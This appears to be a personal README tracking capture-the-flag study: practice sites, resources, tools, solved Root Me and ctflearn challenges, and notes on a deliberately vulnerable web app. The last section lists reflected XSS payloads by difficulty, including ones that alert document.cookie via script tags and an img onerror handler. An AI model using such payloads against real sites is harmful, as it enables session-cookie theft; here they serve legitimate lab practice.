# ctf-

## Sites in use

* hacker101= web, math, android, graphql, recon, math, crypto
* hack the box= pen testing with situations
* try hack me =  bank siutation
* root me = all sites
* ctflearn = basic problems
* DVWA (Damn Vunerable Web Application)


## Resources
* http://ctfs.github.io/resources/ - Introduction to common CTF techniques such as cryptography, steganography, web exploits (Incomplete)
* https://trailofbits.github.io/ctf/forensics/ - Tips and tricks relating to typical CTF challenges/scenarios
* https://tadeuszwachowski.github.io/CTFwriteups/ctflearn/ - CTF Learn answers/solutions

## Blog site
* https://dev.to/atan/what-is-ctf-and-how-to-get-started-3f04

## Websites which may be required
* https://www.dcode.fr/cipher-identifier - a decrypter
* https://www.base64decode.org/ - a decrypter


## App that may be required
* binwalk - Analyze and extract files
* burp suite - Feature packed web penetration testing framework
* stegsolve - Pass various filters over images to look for hidden text
* GDB - Binary debugger
* The command line :)

# PROGRESS

## root-me

### Web - Server
* HTML - Source Code
* HTTP - Open redirect
* Weak Password

### Cryptoanalysis
* Encoding - ASCII
* Encoding - UU

### Web - Client 
* HTML - Disabled buttons
* Javascript - Authentication
* Javascript - Source
* Javascript - Authentication 2

## ctflearn

### Easy
* practise flag
* Base 2 2 the 6
* character encoding
* Where can my robot go
* Wikipedia
* Morse code
* Reverse polarity
* Hextrodinary

## WVWP
- Uses BURP suite and XAMPP
- Reflected Cross site scripting (XSS)
  <br>EASY<br>
  ``<script>alert("asd")</script>``
  <br>
  ``<script>alert(document.cookie)</script>``
  <br>MEDIUM<br>
  ``<Script>alert("asd")</Script>``
  <br>HARD<br>
  ``<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`` = to get access to the cookie
  <br>
  ``<body onload=alert('test1')>`` = to send an alert in another format
   ``<a href="https://www.w3docs.com" target="_blank">Click here to go to W3docs.com</a>`` = redirect to another page (works for levels below)
  <br>IMPOSSIBLE<br>
  - displays user token
  - genuinely impossible
- Bruteforce 
  <br>EASY</br>
- DOM XSS
  <br> EASY <br>
  ``default=Japanese (any text)``
  

